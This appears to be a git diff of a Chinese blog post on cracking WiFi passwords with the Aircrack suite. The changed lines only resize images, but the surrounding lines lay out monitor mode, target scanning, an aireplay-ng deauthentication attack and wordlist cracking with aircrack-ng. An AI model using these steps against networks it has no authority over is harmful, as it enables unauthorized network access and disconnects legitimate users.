@@ -14,20 +14,20 @@ title: Aircrack破解wifi密码
   如果没有开启，输入airmon-ng wlan0 up加载无线网卡
   在这里wlan0就是我的网卡，现在已经正常开启 
  <center>
-  <img src="/images/thumbs/wlan0.png" width="250" height="220" />
+  <img src="/images/thumbs/wlan0.png" width="320" height="260" />
  </center>
                                                                
 ### 开启监听
 ```
 root@kali:~$ airmon-ng start wlan0
 ```
-<img src="/images/0.9.jpg" width="250" height="220" />
+<img src="/images/0.9.jpg" width="320" height="260" />
 
 ### 扫描目标wifi
  ```
  root@kali:~$ airodump-ng wlan0mon
  ```
-<img src="/images/thumbs/mubiao.jpg" width="250" height="220" />   
+<img src="/images/thumbs/mubiao.jpg" width="320" height="260" />   
 
 ### 开始抓握手包
  ```
@@ -41,7 +41,7 @@ root@kali:~$ airmon-ng start wlan0
  ```
 aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  ```
-  <img src="/images/thumbs/attack.jpg" width="250" height="220" />
+  <img src="/images/thumbs/attack.jpg" width="320" height="260" />
  + -0 1：表示使用Deauth攻击模式，后面的1表示攻击次数
  + -a :表示AP的Mac地址
  + -c ：表示客户端的Mac地址
@@ -51,6 +51,6 @@ aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  ```
   root@kali:~$ aircrack-ng abc-01.ivs -w pass-wifi.txt
  ```
-  <img src="/images/thumbs/ben.jpg" width="250" height="220" />
+  <img src="/images/thumbs/ben.jpg" width="320" height="260" />
  + -w是指定我的密码本
 
